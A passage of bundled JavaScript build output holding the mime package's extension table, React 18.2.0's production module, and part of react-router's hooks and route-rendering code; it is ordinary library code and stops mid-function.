"application/vnd.yamaha.hv-script": ["hvs"], "application/vnd.yamaha.hv-voice": ["hvp"], "application/vnd.yamaha.openscoreformat": ["osf"], "application/vnd.yamaha.openscoreformat.osfpvg+xml": ["osfpvg"], "application/vnd.yamaha.smaf-audio": ["saf"], "application/vnd.yamaha.smaf-phrase": ["spf"], "application/vnd.yellowriver-custom-menu": ["cmp"], "application/vnd.zul": ["zir", "zirz"], "application/vnd.zzazz.deck+xml": ["zaz"], "application/x-7z-compressed": ["7z"], "application/x-abiword": ["abw"], "application/x-ace-compressed": ["ace"], "application/x-apple-diskimage": ["*dmg"], "application/x-arj": ["arj"], "application/x-authorware-bin": ["aab", "x32", "u32", "vox"], "application/x-authorware-map": ["aam"], "application/x-authorware-seg": ["aas"], "application/x-bcpio": ["bcpio"], "application/x-bdoc": ["*bdoc"], "application/x-bittorrent": ["torrent"], "application/x-blorb": ["blb", "blorb"], "application/x-bzip": ["bz"], "application/x-bzip2": ["bz2", "boz"], "application/x-cbr": ["cbr", "cba", "cbt", "cbz", "cb7"], "application/x-cdlink": ["vcd"], "application/x-cfs-compressed": ["cfs"], "application/x-chat": ["chat"], "application/x-chess-pgn": ["pgn"], "application/x-chrome-extension": ["crx"], "application/x-cocoa": ["cco"], "application/x-conference": ["nsc"], "application/x-cpio": ["cpio"], "application/x-csh": ["csh"], "application/x-debian-package": ["*deb", "udeb"], "application/x-dgc-compressed": ["dgc"], "application/x-director": ["dir", "dcr", "dxr", "cst", "cct", "cxt", "w3d", "fgd", "swa"], "application/x-doom": ["wad"], "application/x-dtbncx+xml": ["ncx"], "application/x-dtbook+xml": ["dtb"], "application/x-dtbresource+xml": ["res"], "application/x-dvi": ["dvi"], "application/x-envoy": ["evy"], "application/x-eva": ["eva"], "application/x-font-bdf": ["bdf"], "application/x-font-ghostscript": ["gsf"], "application/x-font-linux-psf": ["psf"], "application/x-font-pcf": ["pcf"], "application/x-font-snf": ["snf"], "application/x-font-type1": ["pfa", "pfb", "pfm", "afm"], "application/x-freearc": ["arc"], "application/x-futuresplash": ["spl"], "application/x-gca-compressed": ["gca"], "application/x-glulx": ["ulx"], "application/x-gnumeric": ["gnumeric"], "application/x-gramps-xml": ["gramps"], "application/x-gtar": ["gtar"], "application/x-hdf": ["hdf"], "application/x-httpd-php": ["php"], "application/x-install-instructions": ["install"], "application/x-iso9660-image": ["*iso"], "application/x-iwork-keynote-sffkey": ["*key"], "application/x-iwork-numbers-sffnumbers": ["*numbers"], "application/x-iwork-pages-sffpages": ["*pages"], "application/x-java-archive-diff": ["jardiff"], "application/x-java-jnlp-file": ["jnlp"], "application/x-keepass2": ["kdbx"], "application/x-latex": ["latex"], "application/x-lua-bytecode": ["luac"], "application/x-lzh-compressed": ["lzh", "lha"], "application/x-makeself": ["run"], "application/x-mie": ["mie"], "application/x-mobipocket-ebook": ["prc", "mobi"], "application/x-ms-application": ["application"], "application/x-ms-shortcut": ["lnk"], "application/x-ms-wmd": ["wmd"], "application/x-ms-wmz": ["wmz"], "application/x-ms-xbap": ["xbap"], "application/x-msaccess": ["mdb"], "application/x-msbinder": ["obd"], "application/x-mscardfile": ["crd"], "application/x-msclip": ["clp"], "application/x-msdos-program": ["*exe"], "application/x-msdownload": ["*exe", "*dll", "com", "bat", "*msi"], "application/x-msmediaview": ["mvb", "m13", "m14"], "application/x-msmetafile": ["*wmf", "*wmz", "*emf", "emz"], "application/x-msmoney": ["mny"], "application/x-mspublisher": ["pub"], "application/x-msschedule": ["scd"], "application/x-msterminal": ["trm"], "application/x-mswrite": ["wri"], "application/x-netcdf": ["nc", "cdf"], "application/x-ns-proxy-autoconfig": ["pac"], "application/x-nzb": ["nzb"], "application/x-perl": ["pl", "pm"], "application/x-pilot": ["*prc", "*pdb"], "application/x-pkcs12": ["p12", "pfx"], "application/x-pkcs7-certificates": ["p7b", "spc"], "application/x-pkcs7-certreqresp": ["p7r"], "application/x-rar-compressed": ["*rar"], "application/x-redhat-package-manager": ["rpm"], "application/x-research-info-systems": ["ris"], "application/x-sea": ["sea"], "application/x-sh": ["sh"], "application/x-shar": ["shar"], "application/x-shockwave-flash": ["swf"], "application/x-silverlight-app": ["xap"], "application/x-sql": ["sql"], "application/x-stuffit": ["sit"], "application/x-stuffitx": ["sitx"], "application/x-subrip": ["srt"], "application/x-sv4cpio": ["sv4cpio"], "application/x-sv4crc": ["sv4crc"], "application/x-t3vm-image": ["t3"], "application/x-tads": ["gam"], "application/x-tar": ["tar"], "application/x-tcl": ["tcl", "tk"], "application/x-tex": ["tex"], "application/x-tex-tfm": ["tfm"], "application/x-texinfo": ["texinfo", "texi"], "application/x-tgif": ["*obj"], "application/x-ustar": ["ustar"], "application/x-virtualbox-hdd": ["hdd"], "application/x-virtualbox-ova": ["ova"], "application/x-virtualbox-ovf": ["ovf"], "application/x-virtualbox-vbox": ["vbox"], "application/x-virtualbox-vbox-extpack": ["vbox-extpack"], "application/x-virtualbox-vdi": ["vdi"], "application/x-virtualbox-vhd": ["vhd"], "application/x-virtualbox-vmdk": ["vmdk"], "application/x-wais-source": ["src"], "application/x-web-app-manifest+json": ["webapp"], "application/x-x509-ca-cert": ["der", "crt", "pem"], "application/x-xfig": ["fig"], "application/x-xliff+xml": ["*xlf"], "application/x-xpinstall": ["xpi"], "application/x-xz": ["xz"], "application/x-zmachine": ["z1", "z2", "z3", "z4", "z5", "z6", "z7", "z8"], "audio/vnd.dece.audio": ["uva", "uvva"], "audio/vnd.digital-winds": ["eol"], "audio/vnd.dra": ["dra"], "audio/vnd.dts": ["dts"], "audio/vnd.dts.hd": ["dtshd"], "audio/vnd.lucent.voice": ["lvp"], "audio/vnd.ms-playready.media.pya": ["pya"], "audio/vnd.nuera.ecelp4800": ["ecelp4800"], "audio/vnd.nuera.ecelp7470": ["ecelp7470"], "audio/vnd.nuera.ecelp9600": ["ecelp9600"], "audio/vnd.rip": ["rip"], "audio/x-aac": ["aac"], "audio/x-aiff": ["aif", "aiff", "aifc"], "audio/x-caf": ["caf"], "audio/x-flac": ["flac"], "audio/x-m4a": ["*m4a"], "audio/x-matroska": ["mka"], "audio/x-mpegurl": ["m3u"], "audio/x-ms-wax": ["wax"], "audio/x-ms-wma": ["wma"], "audio/x-pn-realaudio": ["ram", "ra"], "audio/x-pn-realaudio-plugin": ["rmp"], "audio/x-realaudio": ["*ra"], "audio/x-wav": ["*wav"], "chemical/x-cdx": ["cdx"], "chemical/x-cif": ["cif"], "chemical/x-cmdf": ["cmdf"], "chemical/x-cml": ["cml"], "chemical/x-csml": ["csml"], "chemical/x-xyz": ["xyz"], "image/prs.btif": ["btif"], "image/prs.pti": ["pti"], "image/vnd.adobe.photoshop": ["psd"], "image/vnd.airzip.accelerator.azv": ["azv"], "image/vnd.dece.graphic": ["uvi", "uvvi", "uvg", "uvvg"], "image/vnd.djvu": ["djvu", "djv"], "image/vnd.dvb.subtitle": ["*sub"], "image/vnd.dwg": ["dwg"], "image/vnd.dxf": ["dxf"], "image/vnd.fastbidsheet": ["fbs"], "image/vnd.fpx": ["fpx"], "image/vnd.fst": ["fst"], "image/vnd.fujixerox.edmics-mmr": ["mmr"], "image/vnd.fujixerox.edmics-rlc": ["rlc"], "image/vnd.microsoft.icon": ["ico"], "image/vnd.ms-dds": ["dds"], "image/vnd.ms-modi": ["mdi"], "image/vnd.ms-photo": ["wdp"], "image/vnd.net-fpx": ["npx"], "image/vnd.pco.b16": ["b16"], "image/vnd.tencent.tap": ["tap"], "image/vnd.valve.source.texture": ["vtf"], "image/vnd.wap.wbmp": ["wbmp"], "image/vnd.xiff": ["xif"], "image/vnd.zbrush.pcx": ["pcx"], "image/x-3ds": ["3ds"], "image/x-cmu-raster": ["ras"], "image/x-cmx": ["cmx"], "image/x-freehand": ["fh", "fhc", "fh4", "fh5", "fh7"], "image/x-icon": ["*ico"], "image/x-jng": ["jng"], "image/x-mrsid-image": ["sid"], "image/x-ms-bmp": ["*bmp"], "image/x-pcx": ["*pcx"], "image/x-pict": ["pic", "pct"], "image/x-portable-anymap": ["pnm"], "image/x-portable-bitmap": ["pbm"], "image/x-portable-graymap": ["pgm"], "image/x-portable-pixmap": ["ppm"], "image/x-rgb": ["rgb"], "image/x-tga": ["tga"], "image/x-xbitmap": ["xbm"], "image/x-xpixmap": ["xpm"], "image/x-xwindowdump": ["xwd"], "message/vnd.wfa.wsc": ["wsc"], "model/vnd.collada+xml": ["dae"], "model/vnd.dwf": ["dwf"], "model/vnd.gdl": ["gdl"], "model/vnd.gtw": ["gtw"], "model/vnd.mts": ["mts"], "model/vnd.opengex": ["ogex"], "model/vnd.parasolid.transmit.binary": ["x_b"], "model/vnd.parasolid.transmit.text": ["x_t"], "model/vnd.sap.vds": ["vds"], "model/vnd.usdz+zip": ["usdz"], "model/vnd.valve.source.compiled-map": ["bsp"], "model/vnd.vtu": ["vtu"], "text/prs.lines.tag": ["dsc"], "text/vnd.curl": ["curl"], "text/vnd.curl.dcurl": ["dcurl"], "text/vnd.curl.mcurl": ["mcurl"], "text/vnd.curl.scurl": ["scurl"], "text/vnd.dvb.subtitle": ["sub"], "text/vnd.fly": ["fly"], "text/vnd.fmi.flexstor": ["flx"], "text/vnd.graphviz": ["gv"], "text/vnd.in3d.3dml": ["3dml"], "text/vnd.in3d.spot": ["spot"], "text/vnd.sun.j2me.app-descriptor": ["jad"], "text/vnd.wap.wml": ["wml"], "text/vnd.wap.wmlscript": ["wmls"], "text/x-asm": ["s", "asm"], "text/x-c": ["c", "cc", "cxx", "cpp", "h", "hh", "dic"], "text/x-component": ["htc"], "text/x-fortran": ["f", "for", "f77", "f90"], "text/x-handlebars-template": ["hbs"], "text/x-java-source": ["java"], "text/x-lua": ["lua"], "text/x-markdown": ["mkd"], "text/x-nfo": ["nfo"], "text/x-opml": ["opml"], "text/x-org": ["*org"], "text/x-pascal": ["p", "pas"], "text/x-processing": ["pde"], "text/x-sass": ["sass"], "text/x-scss": ["scss"], "text/x-setext": ["etx"], "text/x-sfv": ["sfv"], "text/x-suse-ymp": ["ymp"], "text/x-uuencode": ["uu"], "text/x-vcalendar": ["vcs"], "text/x-vcard": ["vcf"], "video/vnd.dece.hd": ["uvh", "uvvh"], "video/vnd.dece.mobile": ["uvm", "uvvm"], "video/vnd.dece.pd": ["uvp", "uvvp"], "video/vnd.dece.sd": ["uvs", "uvvs"], "video/vnd.dece.video": ["uvv", "uvvv"], "video/vnd.dvb.file": ["dvb"], "video/vnd.fvt": ["fvt"], "video/vnd.mpegurl": ["mxu", "m4u"], "video/vnd.ms-playready.media.pyv": ["pyv"], "video/vnd.uvvu.mp4": ["uvu", "uvvu"], "video/vnd.vivo": ["viv"], "video/x-f4v": ["f4v"], "video/x-fli": ["fli"], "video/x-flv": ["flv"], "video/x-m4v": ["m4v"], "video/x-matroska": ["mkv", "mk3d", "mks"], "video/x-mng": ["mng"], "video/x-ms-asf": ["asf", "asx"], "video/x-ms-vob": ["vob"], "video/x-ms-wm": ["wm"], "video/x-ms-wmv": ["wmv"], "video/x-ms-wmx": ["wmx"], "video/x-ms-wvx": ["wvx"], "video/x-msvideo": ["avi"], "video/x-sgi-movie": ["movie"], "video/x-smv": ["smv"], "x-conference/x-cooltalk": ["ice"] };
  }
});

// node_modules/mime/index.js
var require_mime = __commonJS({
  "node_modules/mime/index.js"(exports, module) {
    "use strict";
    var Mime = require_Mime();
    module.exports = new Mime(require_standard(), require_other());
  }
});

// node_modules/react/cjs/react.production.min.js
var require_react_production_min = __commonJS({
  "node_modules/react/cjs/react.production.min.js"(exports) {
    "use strict";
    var l = Symbol.for("react.element"), n = Symbol.for("react.portal"), p = Symbol.for("react.fragment"), q = Symbol.for("react.strict_mode"), r = Symbol.for("react.profiler"), t = Symbol.for("react.provider"), u = Symbol.for("react.context"), v = Symbol.for("react.forward_ref"), w = Symbol.for("react.suspense"), x = Symbol.for("react.memo"), y = Symbol.for("react.lazy"), z = Symbol.iterator;
    function A(a) {
      return a === null || typeof a != "object" ? null : (a = z && a[z] || a["@@iterator"], typeof a == "function" ? a : null);
    }
    var B = { isMounted: function() {
      return !1;
    }, enqueueForceUpdate: function() {
    }, enqueueReplaceState: function() {
    }, enqueueSetState: function() {
    } }, C = Object.assign, D = {};
    function E(a, b, e) {
      this.props = a, this.context = b, this.refs = D, this.updater = e || B;
    }
    E.prototype.isReactComponent = {};
    E.prototype.setState = function(a, b) {
      if (typeof a != "object" && typeof a != "function" && a != null)
        throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
      this.updater.enqueueSetState(this, a, b, "setState");
    };
    E.prototype.forceUpdate = function(a) {
      this.updater.enqueueForceUpdate(this, a, "forceUpdate");
    };
    function F() {
    }
    F.prototype = E.prototype;
    function G(a, b, e) {
      this.props = a, this.context = b, this.refs = D, this.updater = e || B;
    }
    var H = G.prototype = new F();
    H.constructor = G;
    C(H, E.prototype);
    H.isPureReactComponent = !0;
    var I = Array.isArray, J = Object.prototype.hasOwnProperty, K = { current: null }, L = { key: !0, ref: !0, __self: !0, __source: !0 };
    function M(a, b, e) {
      var d, c = {}, k = null, h = null;
      if (b != null)
        for (d in b.ref !== void 0 && (h = b.ref), b.key !== void 0 && (k = "" + b.key), b)
          J.call(b, d) && !L.hasOwnProperty(d) && (c[d] = b[d]);
      var g = arguments.length - 2;
      if (g === 1)
        c.children = e;
      else if (1 < g) {
        for (var f = Array(g), m = 0; m < g; m++)
          f[m] = arguments[m + 2];
        c.children = f;
      }
      if (a && a.defaultProps)
        for (d in g = a.defaultProps, g)
          c[d] === void 0 && (c[d] = g[d]);
      return { $$typeof: l, type: a, key: k, ref: h, props: c, _owner: K.current };
    }
    function N(a, b) {
      return { $$typeof: l, type: a.type, key: b, ref: a.ref, props: a.props, _owner: a._owner };
    }
    function O(a) {
      return typeof a == "object" && a !== null && a.$$typeof === l;
    }
    function escape(a) {
      var b = { "=": "=0", ":": "=2" };
      return "$" + a.replace(/[=:]/g, function(a2) {
        return b[a2];
      });
    }
    var P = /\/+/g;
    function Q(a, b) {
      return typeof a == "object" && a !== null && a.key != null ? escape("" + a.key) : b.toString(36);
    }
    function R(a, b, e, d, c) {
      var k = typeof a;
      (k === "undefined" || k === "boolean") && (a = null);
      var h = !1;
      if (a === null)
        h = !0;
      else
        switch (k) {
          case "string":
          case "number":
            h = !0;
            break;
          case "object":
            switch (a.$$typeof) {
              case l:
              case n:
                h = !0;
            }
        }
      if (h)
        return h = a, c = c(h), a = d === "" ? "." + Q(h, 0) : d, I(c) ? (e = "", a != null && (e = a.replace(P, "$&/") + "/"), R(c, b, e, "", function(a2) {
          return a2;
        })) : c != null && (O(c) && (c = N(c, e + (!c.key || h && h.key === c.key ? "" : ("" + c.key).replace(P, "$&/") + "/") + a)), b.push(c)), 1;
      if (h = 0, d = d === "" ? "." : d + ":", I(a))
        for (var g = 0; g < a.length; g++) {
          k = a[g];
          var f = d + Q(k, g);
          h += R(k, b, e, f, c);
        }
      else if (f = A(a), typeof f == "function")
        for (a = f.call(a), g = 0; !(k = a.next()).done; )
          k = k.value, f = d + Q(k, g++), h += R(k, b, e, f, c);
      else if (k === "object")
        throw b = String(a), Error("Objects are not valid as a React child (found: " + (b === "[object Object]" ? "object with keys {" + Object.keys(a).join(", ") + "}" : b) + "). If you meant to render a collection of children, use an array instead.");
      return h;
    }
    function S(a, b, e) {
      if (a == null)
        return a;
      var d = [], c = 0;
      return R(a, d, "", "", function(a2) {
        return b.call(e, a2, c++);
      }), d;
    }
    function T(a) {
      if (a._status === -1) {
        var b = a._result;
        b = b(), b.then(function(b2) {
          (a._status === 0 || a._status === -1) && (a._status = 1, a._result = b2);
        }, function(b2) {
          (a._status === 0 || a._status === -1) && (a._status = 2, a._result = b2);
        }), a._status === -1 && (a._status = 0, a._result = b);
      }
      if (a._status === 1)
        return a._result.default;
      throw a._result;
    }
    var U = { current: null }, V = { transition: null }, W = { ReactCurrentDispatcher: U, ReactCurrentBatchConfig: V, ReactCurrentOwner: K };
    exports.Children = { map: S, forEach: function(a, b, e) {
      S(a, function() {
        b.apply(this, arguments);
      }, e);
    }, count: function(a) {
      var b = 0;
      return S(a, function() {
        b++;
      }), b;
    }, toArray: function(a) {
      return S(a, function(a2) {
        return a2;
      }) || [];
    }, only: function(a) {
      if (!O(a))
        throw Error("React.Children.only expected to receive a single React element child.");
      return a;
    } };
    exports.Component = E;
    exports.Fragment = p;
    exports.Profiler = r;
    exports.PureComponent = G;
    exports.StrictMode = q;
    exports.Suspense = w;
    exports.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = W;
    exports.cloneElement = function(a, b, e) {
      if (a == null)
        throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + a + ".");
      var d = C({}, a.props), c = a.key, k = a.ref, h = a._owner;
      if (b != null) {
        if (b.ref !== void 0 && (k = b.ref, h = K.current), b.key !== void 0 && (c = "" + b.key), a.type && a.type.defaultProps)
          var g = a.type.defaultProps;
        for (f in b)
          J.call(b, f) && !L.hasOwnProperty(f) && (d[f] = b[f] === void 0 && g !== void 0 ? g[f] : b[f]);
      }
      var f = arguments.length - 2;
      if (f === 1)
        d.children = e;
      else if (1 < f) {
        g = Array(f);
        for (var m = 0; m < f; m++)
          g[m] = arguments[m + 2];
        d.children = g;
      }
      return { $$typeof: l, type: a.type, key: c, ref: k, props: d, _owner: h };
    };
    exports.createContext = function(a) {
      return a = { $$typeof: u, _currentValue: a, _currentValue2: a, _threadCount: 0, Provider: null, Consumer: null, _defaultValue: null, _globalName: null }, a.Provider = { $$typeof: t, _context: a }, a.Consumer = a;
    };
    exports.createElement = M;
    exports.createFactory = function(a) {
      var b = M.bind(null, a);
      return b.type = a, b;
    };
    exports.createRef = function() {
      return { current: null };
    };
    exports.forwardRef = function(a) {
      return { $$typeof: v, render: a };
    };
    exports.isValidElement = O;
    exports.lazy = function(a) {
      return { $$typeof: y, _payload: { _status: -1, _result: a }, _init: T };
    };
    exports.memo = function(a, b) {
      return { $$typeof: x, type: a, compare: b === void 0 ? null : b };
    };
    exports.startTransition = function(a) {
      var b = V.transition;
      V.transition = {};
      try {
        a();
      } finally {
        V.transition = b;
      }
    };
    exports.unstable_act = function() {
      throw Error("act(...) is not supported in production builds of React.");
    };
    exports.useCallback = function(a, b) {
      return U.current.useCallback(a, b);
    };
    exports.useContext = function(a) {
      return U.current.useContext(a);
    };
    exports.useDebugValue = function() {
    };
    exports.useDeferredValue = function(a) {
      return U.current.useDeferredValue(a);
    };
    exports.useEffect = function(a, b) {
      return U.current.useEffect(a, b);
    };
    exports.useId = function() {
      return U.current.useId();
    };
    exports.useImperativeHandle = function(a, b, e) {
      return U.current.useImperativeHandle(a, b, e);
    };
    exports.useInsertionEffect = function(a, b) {
      return U.current.useInsertionEffect(a, b);
    };
    exports.useLayoutEffect = function(a, b) {
      return U.current.useLayoutEffect(a, b);
    };
    exports.useMemo = function(a, b) {
      return U.current.useMemo(a, b);
    };
    exports.useReducer = function(a, b, e) {
      return U.current.useReducer(a, b, e);
    };
    exports.useRef = function(a) {
      return U.current.useRef(a);
    };
    exports.useState = function(a) {
      return U.current.useState(a);
    };
    exports.useSyncExternalStore = function(a, b, e) {
      return U.current.useSyncExternalStore(a, b, e);
    };
    exports.useTransition = function() {
      return U.current.useTransition();
    };
    exports.version = "18.2.0";
  }
});

// node_modules/react/index.js
var require_react = __commonJS({
  "node_modules/react/index.js"(exports, module) {
    "use strict";
    module.exports = require_react_production_min();
  }
});

// node_modules/react-router/dist/index.js
var dist_exports = {};
__export(dist_exports, {
  AbortedDeferredError: () => AbortedDeferredError,
  Await: () => Await,
  MemoryRouter: () => MemoryRouter,
  Navigate: () => Navigate,
  NavigationType: () => Action,
  Outlet: () => Outlet,
  Route: () => Route,
  Router: () => Router,
  RouterProvider: () => RouterProvider,
  Routes: () => Routes,
  UNSAFE_DataRouterContext: () => DataRouterContext,
  UNSAFE_DataRouterStateContext: () => DataRouterStateContext,
  UNSAFE_LocationContext: () => LocationContext,
  UNSAFE_NavigationContext: () => NavigationContext,
  UNSAFE_RouteContext: () => RouteContext,
  UNSAFE_mapRouteProperties: () => mapRouteProperties,
  UNSAFE_useRouteId: () => useRouteId,
  UNSAFE_useRoutesImpl: () => useRoutesImpl,
  createMemoryRouter: () => createMemoryRouter,
  createPath: () => createPath,
  createRoutesFromChildren: () => createRoutesFromChildren,
  createRoutesFromElements: () => createRoutesFromChildren,
  defer: () => defer,
  generatePath: () => generatePath,
  isRouteErrorResponse: () => isRouteErrorResponse,
  json: () => json,
  matchPath: () => matchPath,
  matchRoutes: () => matchRoutes,
  parsePath: () => parsePath,
  redirect: () => redirect,
  renderMatches: () => renderMatches,
  resolvePath: () => resolvePath,
  unstable_useBlocker: () => useBlocker,
  useActionData: () => useActionData,
  useAsyncError: () => useAsyncError,
  useAsyncValue: () => useAsyncValue,
  useHref: () => useHref,
  useInRouterContext: () => useInRouterContext,
  useLoaderData: () => useLoaderData,
  useLocation: () => useLocation,
  useMatch: () => useMatch,
  useMatches: () => useMatches,
  useNavigate: () => useNavigate,
  useNavigation: () => useNavigation,
  useNavigationType: () => useNavigationType,
  useOutlet: () => useOutlet,
  useOutletContext: () => useOutletContext,
  useParams: () => useParams,
  useResolvedPath: () => useResolvedPath,
  useRevalidator: () => useRevalidator,
  useRouteError: () => useRouteError,
  useRouteLoaderData: () => useRouteLoaderData,
  useRoutes: () => useRoutes
});
function _extends2() {
  return _extends2 = Object.assign ? Object.assign.bind() : function(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i];
      for (var key in source)
        Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
    }
    return target;
  }, _extends2.apply(this, arguments);
}
function useHref(to, _temp) {
  let {
    relative
  } = _temp === void 0 ? {} : _temp;
  useInRouterContext() || invariant(!1);
  let {
    basename,
    navigator
  } = React.useContext(NavigationContext), {
    hash,
    pathname,
    search
  } = useResolvedPath(to, {
    relative
  }), joinedPathname = pathname;
  return basename !== "/" && (joinedPathname = pathname === "/" ? basename : joinPaths([basename, pathname])), navigator.createHref({
    pathname: joinedPathname,
    search,
    hash
  });
}
function useInRouterContext() {
  return React.useContext(LocationContext) != null;
}
function useLocation() {
  return useInRouterContext() || invariant(!1), React.useContext(LocationContext).location;
}
function useNavigationType() {
  return React.useContext(LocationContext).navigationType;
}
function useMatch(pattern) {
  useInRouterContext() || invariant(!1);
  let {
    pathname
  } = useLocation();
  return React.useMemo(() => matchPath(pattern, pathname), [pathname, pattern]);
}
function useIsomorphicLayoutEffect(cb) {
  React.useContext(NavigationContext).static || React.useLayoutEffect(cb);
}
function useNavigate() {
  let {
    isDataRoute
  } = React.useContext(RouteContext);
  return isDataRoute ? useNavigateStable() : useNavigateUnstable();
}
function useNavigateUnstable() {
  useInRouterContext() || invariant(!1);
  let dataRouterContext = React.useContext(DataRouterContext), {
    basename,
    navigator
  } = React.useContext(NavigationContext), {
    matches
  } = React.useContext(RouteContext), {
    pathname: locationPathname
  } = useLocation(), routePathnamesJson = JSON.stringify(getPathContributingMatches(matches).map((match) => match.pathnameBase)), activeRef = React.useRef(!1);
  return useIsomorphicLayoutEffect(() => {
    activeRef.current = !0;
  }), React.useCallback(function(to, options) {
    if (options === void 0 && (options = {}), !activeRef.current)
      return;
    if (typeof to == "number") {
      navigator.go(to);
      return;
    }
    let path2 = resolveTo(to, JSON.parse(routePathnamesJson), locationPathname, options.relative === "path");
    dataRouterContext == null && basename !== "/" && (path2.pathname = path2.pathname === "/" ? basename : joinPaths([basename, path2.pathname])), (options.replace ? navigator.replace : navigator.push)(path2, options.state, options);
  }, [basename, navigator, routePathnamesJson, locationPathname, dataRouterContext]);
}
function useOutletContext() {
  return React.useContext(OutletContext);
}
function useOutlet(context) {
  let outlet = React.useContext(RouteContext).outlet;
  return outlet && /* @__PURE__ */ React.createElement(OutletContext.Provider, {
    value: context
  }, outlet);
}
function useParams() {
  let {
    matches
  } = React.useContext(RouteContext), routeMatch = matches[matches.length - 1];
  return routeMatch ? routeMatch.params : {};
}
function useResolvedPath(to, _temp2) {
  let {
    relative
  } = _temp2 === void 0 ? {} : _temp2, {
    matches
  } = React.useContext(RouteContext), {
    pathname: locationPathname
  } = useLocation(), routePathnamesJson = JSON.stringify(getPathContributingMatches(matches).map((match) => match.pathnameBase));
  return React.useMemo(() => resolveTo(to, JSON.parse(routePathnamesJson), locationPathname, relative === "path"), [to, routePathnamesJson, locationPathname, relative]);
}
function useRoutes(routes2, locationArg) {
  return useRoutesImpl(routes2, locationArg);
}
function useRoutesImpl(routes2, locationArg, dataRouterState) {
  useInRouterContext() || invariant(!1);
  let {
    navigator
  } = React.useContext(NavigationContext), {
    matches: parentMatches
  } = React.useContext(RouteContext), routeMatch = parentMatches[parentMatches.length - 1], parentParams = routeMatch ? routeMatch.params : {}, parentPathname = routeMatch ? routeMatch.pathname : "/", parentPathnameBase = routeMatch ? routeMatch.pathnameBase : "/", parentRoute = routeMatch && routeMatch.route, locationFromContext = useLocation(), location;
  if (locationArg) {
    var _parsedLocationArg$pa;
    let parsedLocationArg = typeof locationArg == "string" ? parsePath(locationArg) : locationArg;
    parentPathnameBase === "/" || (_parsedLocationArg$pa = parsedLocationArg.pathname) != null && _parsedLocationArg$pa.startsWith(parentPathnameBase) || invariant(!1), location = parsedLocationArg;
  } else
    location = locationFromContext;
  let pathname = location.pathname || "/", remainingPathname = parentPathnameBase === "/" ? pathname : pathname.slice(parentPathnameBase.length) || "/", matches = matchRoutes(routes2, {
    pathname: remainingPathname
  }), renderedMatches = _renderMatches(matches && matches.map((match) => Object.assign({}, match, {
    params: Object.assign({}, parentParams, match.params),
    pathname: joinPaths([
      parentPathnameBase,
      // Re-encode pathnames that were decoded inside matchRoutes
      navigator.encodeLocation ? navigator.encodeLocation(match.pathname).pathname : match.pathname
    ]),
    pathnameBase: match.pathnameBase === "/" ? parentPathnameBase : joinPaths([
      parentPathnameBase,
      // Re-encode pathnames that were decoded inside matchRoutes
      navigator.encodeLocation ? navigator.encodeLocation(match.pathnameBase).pathname : match.pathnameBase
    ])
  })), parentMatches, dataRouterState);
  return locationArg && renderedMatches ? /* @__PURE__ */ React.createElement(LocationContext.Provider, {
    value: {
      location: _extends2({
        pathname: "/",
        search: "",
        hash: "",
        state: null,
        key: "default"
      }, location),
      navigationType: Action.Pop
    }
  }, renderedMatches) : renderedMatches;
}
function DefaultErrorComponent() {
  let error = useRouteError(), message = isRouteErrorResponse(error) ? error.status + " " + error.statusText : error instanceof Error ? error.message : JSON.stringify(error), stack = error instanceof Error ? error.stack : null, lightgrey = "rgba(200,200,200, 0.5)", preStyles = {
    padding: "0.5rem",
    backgroundColor: lightgrey
  }, codeStyles = {
    padding: "2px 4px",
    backgroundColor: lightgrey
  };
  return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("h2", null, "Unexpected Application Error!"), /* @__PURE__ */ React.createElement("h3", {
    style: {
      fontStyle: "italic"
    }
  }, message), stack ? /* @__PURE__ */ React.createElement("pre", {
    style: preStyles
  }, stack) : null, null);
}
function RenderedRoute(_ref) {
  let {
    routeContext,
    match,
    children
  } = _ref, dataRouterContext = React.useContext(DataRouterContext);
  return dataRouterContext && dataRouterContext.static && dataRouterContext.staticContext && (match.route.errorElement || match.route.ErrorBoundary) && (dataRouterContext.staticContext._deepestRenderedBoundaryId = match.route.id), /* @__PURE__ */ React.createElement(RouteContext.Provider, {
    value: routeContext
  }, children);
}
function _renderMatches(matches, parentMatches, dataRouterState) {
  var _dataRouterState2;
  if (parentMatches === void 0 && (parentMatches = []), dataRouterState === void 0 && (dataRouterState = null), matches == null) {
    var _dataRouterState;
    if ((_dataRouterState = dataRouterState) != null && _dataRouterState.errors)
      matches = dataRouterState.matches;
    else
      return null;
  }
  let renderedMatches = matches, errors = (_dataRouterState2 = dataRouterState) == null ? void 0 : _dataRouterState2.errors;
  if (errors != null) {
    let errorIndex = renderedMatches.findIndex((m) => m.route.id && (errors == null ? void 0 : errors[m.route.id]));
    errorIndex >= 0 || invariant(!1), renderedMatches = renderedMatches.slice(0, Math.min(renderedMatches.length, errorIndex + 1));
  }
  return renderedMatches.reduceRight((outlet, match, index) => {
    let error = match.route.id ? errors == null ? void 0 : errors[match.route.id] : null, errorElement = null;
    dataRouterState && (errorElement = match.route.errorElement || defaultErrorElement);
    let matches2 = parentMatches.concat(renderedMatches.slice(0, index + 1)), getChildren = () => {
      let children;
      return error ? children = errorElement : match.route.Component ? children = /* @__PURE__ */ React.createElement(match.route.Component, null) : match.route.element ? children = match.route.element : children = outlet, /* @__PURE__ */ React.createElement(RenderedRoute, {
        match,
        routeContext: {
          outlet,
          matches: matches2,
          isDataRoute: dataRouterState != null
        },
        children
      });
    };
    return dataRouterState && (match.route.ErrorBoundary || match.route.errorElement || index === 0) ? /* @__PURE__ */ React.createElement(RenderErrorBoundary, {
      location: dataRouterState.location,
      revalidation: dataRouterState.revalidation,
      component: errorElement,
      error,
      children: getChildren(),
      routeContext: {
        outlet: null,
        matches: matches2,
        isDataRoute: !0
      }
    }) : getChildren();
  }, null);
}
function useDataRouterContext(hookName) {
  let ctx = React.useContext(DataRouterContext);
  return ctx || invariant(!1), ctx;
}
function useDataRouterState(hookName) {
  let state = React.useContext(DataRouterStateContext);
  return state || invariant(!1), state;
}
function useRouteContext(hookName) {
  let route = React.useContext(RouteContext);
  return route || invariant(!1), route;
}
function useCurrentRouteId(hookName) {
  let route = useRouteContext(hookName), thisRoute = route.matches[route.matches.length - 1];
  return thisRoute.route.id || invariant(!1), thisRoute.route.id;
}
function useRouteId() {
  return useCurrentRouteId(DataRouterStateHook.UseRouteId);
}
function useNavigation() {
